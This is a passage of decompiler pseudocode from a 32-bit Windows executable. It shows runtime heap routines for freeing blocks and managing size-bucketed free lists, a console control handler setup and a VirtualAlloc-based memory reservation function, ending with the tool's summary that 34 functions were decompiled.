  int v8; // esi
  int v9; // edi
  int *v10; // ecx
  int v11; // esi
  int v12; // ecx
  int v13; // ebx
  int v14; // edi
  unsigned int *v15; // ecx
  int v16; // ebx
  int v17; // ecx
  unsigned int *v18; // ebx
  int v19; // [esp+Ch] [ebp-8h]
  int v20; // [esp+10h] [ebp-4h]

  result = a1;
  v2 = (_DWORD *)(a1 - 4);
  if ( *(int *)(a1 - 4) < 0 )
  {
    result = *v2 & 0x7FFFFFFF;
    v3 = (int *)(a1 - 8);
    v4 = &v2[*v2 - 1];
    v20 = -1;
    if ( (v4[1] & 0x80000000) == 0 )
    {
      v5 = &v4[v4[1]];
      if ( *v5 > dword_405278 )
      {
        if ( *v5 > dword_405280 )
        {
          if ( *v5 > dword_405284 )
            v19 = 7;
          else
            v19 = 6;
        }
        else
        {
          v19 = *v5 <= dword_40527C ? 4 : 5;
        }
      }
      else
      {
        if ( *v5 > dword_405270 )
        {
          if ( *v5 > dword_405274 )
            v6 = 3;
          else
            v6 = 2;
        }
        else
        {
          v6 = *v5 > dword_40526C;
        }
        v19 = v6;
      }
      v20 = v19;
      result += *v5;
      *v5 = result;
      v5[-result + 1] = result;
      v4 = v5;
    }
    if ( *v3 >= 0 )
    {
      result += *v3;
      if ( *v3 > (unsigned int)dword_405278 )
      {
        if ( *v3 > (unsigned int)dword_405280 )
        {
          if ( *v3 > (unsigned int)dword_405284 )
            v8 = 7;
          else
            v8 = 6;
        }
        else
        {
          v8 = *v3 <= (unsigned int)dword_40527C ? 4 : 5;
        }
      }
      else
      {
        if ( *v3 > (unsigned int)dword_405270 )
        {
          if ( *v3 > (unsigned int)dword_405274 )
            v7 = 3;
          else
            v7 = 2;
        }
        else
        {
          v7 = *v3 > (unsigned int)dword_40526C;
        }
        v8 = v7;
      }
      v9 = v8;
      v10 = *(int **)(a1 - 12);
      if ( v3 == v10 )
      {
        dword_40523C[v8] = 0;
        if ( dword_40528C == v8 )
        {
          while ( !dword_40523C[dword_40528C] && dword_40528C < 7 )
            ++dword_40528C;
        }
      }
      else
      {
        v11 = *(_DWORD *)(a1 - 16);
        *(_DWORD *)(v11 - 4) = v10;
        *(v10 - 2) = v11;
        if ( (int *)dword_40523C[v9] == v3 )
          dword_40523C[v9] = v11;
      }
      *v4 = result;
      v4[-result + 1] = result;
    }
    if ( result > dword_405278 )
    {
      if ( result > dword_405280 )
      {
        if ( result > dword_405284 )
          v13 = 7;
        else
          v13 = 6;
      }
      else
      {
        v13 = result <= dword_40527C ? 4 : 5;
      }
    }
    else
    {
      if ( result > dword_405270 )
      {
        if ( result > dword_405274 )
          v12 = 3;
        else
          v12 = 2;
      }
      else
      {
        v12 = result > dword_40526C;
      }
      v13 = v12;
    }
    v14 = v13;
    if ( v20 != v13 )
    {
      if ( v20 >= 0 )
      {
        v15 = (unsigned int *)*(v4 - 1);
        if ( v4 == v15 )
        {
          dword_40523C[v20] = 0;
          if ( dword_40528C == v20 )
          {
            while ( !dword_40523C[dword_40528C] && dword_40528C < 7 )
              ++dword_40528C;
          }
        }
        else
        {
          v16 = *(v4 - 2);
          *(_DWORD *)(v16 - 4) = v15;
          *(v15 - 2) = v16;
          if ( (unsigned int *)dword_40523C[v20] == v4 )
            dword_40523C[v20] = v16;
        }
      }
      v17 = dword_40523C[v14];
      if ( v17 )
      {
        v18 = *(unsigned int **)(v17 - 8);
      }
      else
      {
        v18 = v4;
        v17 = (int)v4;
        dword_40523C[v14] = (int)v4;
        if ( dword_40528C > v14 )
          dword_40528C = v14;
      }
      *(v4 - 1) = v17;
      *(_DWORD *)(v17 - 8) = v4;
      *(v18 - 1) = (unsigned int)v4;
      *(v4 - 2) = (unsigned int)v18;
      v4[-result + 1] = result;
      *v4 = result;
      dword_405290 = v14;
      dword_40523C[v14] = (int)v4;
    }
  }
  else
  {
    dword_405298 = 22;
  }
  return result;
}
// 40526C: using guessed type int dword_40526C;
// 405270: using guessed type int dword_405270;
// 405274: using guessed type int dword_405274;
// 405278: using guessed type int dword_405278;
// 40527C: using guessed type int dword_40527C;
// 405280: using guessed type int dword_405280;
// 405284: using guessed type int dword_405284;
// 40528C: using guessed type int dword_40528C;
// 405290: using guessed type int dword_405290;
// 405298: using guessed type int dword_405298;

//----- (00403620) --------------------------------------------------------
int __cdecl sub_403620(LPVOID lpMem)
{
  int result; // eax

  if ( lpMem )
  {
    if ( (char *)lpMem - 4 > (char *)dword_405264 && (char *)lpMem - 4 < (char *)dword_405260 )
      result = _sheap_free((unsigned int)lpMem);
    else
      result = sub_402570(lpMem);
  }
  return result;
}
// 405260: using guessed type int dword_405260;
// 405264: using guessed type int dword_405264;

//----- (00403660) --------------------------------------------------------
BOOL __stdcall HandlerRoutine(DWORD CtrlType)
{
  int v1; // eax
  void (__cdecl *v2)(int); // ebx

  v1 = sub_4036A0(2, 1);
  v2 = (void (__cdecl *)(int))v1;
  if ( v1 == -1 || !v1 )
    return 0;
  if ( v1 != 1 )
  {
    sub_4036A0(2, 0);
    v2(2);
  }
  return 1;
}

//----- (004036A0) --------------------------------------------------------
int __cdecl sub_4036A0(int a1, int a2)
{
  int v3; // edx

  if ( a1 <= 0 || a1 >= 44 || a2 == -1 )
    return -1;
  if ( a1 == 2 && !byte_405294 )
  {
    if ( !SetConsoleCtrlHandler(HandlerRoutine, 1) )
      return -1;
    byte_405294 = 1;
  }
  v3 = dword_40503C[a1];
  dword_40503C[a1] = a2;
  return v3;
}
// 405294: using guessed type char byte_405294;

//----- (00403700) --------------------------------------------------------
const void *__cdecl sub_403700(SIZE_T dwSize)
{
  const void *result; // eax
  char *v2; // eax
  const void *v3; // esi
  struct _MEMORY_BASIC_INFORMATION Buffer; // [esp+8h] [ebp-1Ch] BYREF

  if ( lpAddress || (result = VirtualAlloc(0, ::dwSize, 0x2000u, 1u), (lpAddress = result) != 0) )
  {
    result = (const void *)VirtualQuery(lpAddress, &Buffer, 0x1Cu);
    if ( result )
    {
      if ( Buffer.State == 4096 )
        v2 = (char *)lpAddress + Buffer.RegionSize;
      else
        v2 = (char *)lpAddress;
      v3 = v2;
      if ( &v2[dwSize] < (char *)lpAddress + ::dwSize )
      {
        result = VirtualAlloc(v2, dwSize, 0x1000u, 4u);
        if ( result )
          result = v3;
      }
      else
      {
        result = 0;
      }
    }
  }
  return result;
}

// nfuncs=35 queued=34 decompiled=34 lumina nreq=0 worse=0 better=0
// ALL OK, 34 function(s) have been successfully decompiled
